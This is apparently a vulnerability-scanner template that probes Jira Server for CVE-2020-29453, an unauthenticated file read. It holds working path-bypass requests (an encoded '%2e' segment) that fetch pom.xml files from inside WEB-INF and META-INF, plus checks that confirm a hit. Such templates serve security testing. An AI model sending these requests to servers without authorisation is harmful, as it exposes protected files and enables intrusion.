name: poc-yaml-jira-cve-2020-29453-fileread
binding: ba799fb9-6a27-4ce9-9f27-9f8042bd160f
manual: true
detail:
    author: Xz
    links:
        - https://jira.atlassian.com/browse/JRASERVER-72014
        - https://nvd.nist.gov/vuln/detail/CVE-2020-29453
    vulnerability:
        id: CT-149779
        level: medium
    description: The CachingResourceDownloadRewriteRule class in Jira Server and Jira Data Center allowed unauthenticated remote attackers to read arbitrary files within WEB-INF and META-INF directories via an incorrect path access check.
transport: http
set:
    randstr: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /s/{{randstr}}/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
        expression: response.status == 200 && response.body.bcontains(b"<groupId>com.atlassian.jira</groupId>") && response.body.bstartsWith(b"<project xmlns=")
    r1:
        request:
            cache: true
            method: GET
            path: /s/{{randstr}}/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
        expression: response.status == 200 && response.body.bcontains(b"<groupId>com.atlassian.jira</groupId>") && response.body.bstartsWith(b"<project xmlns=")
expression: r0() || r1()
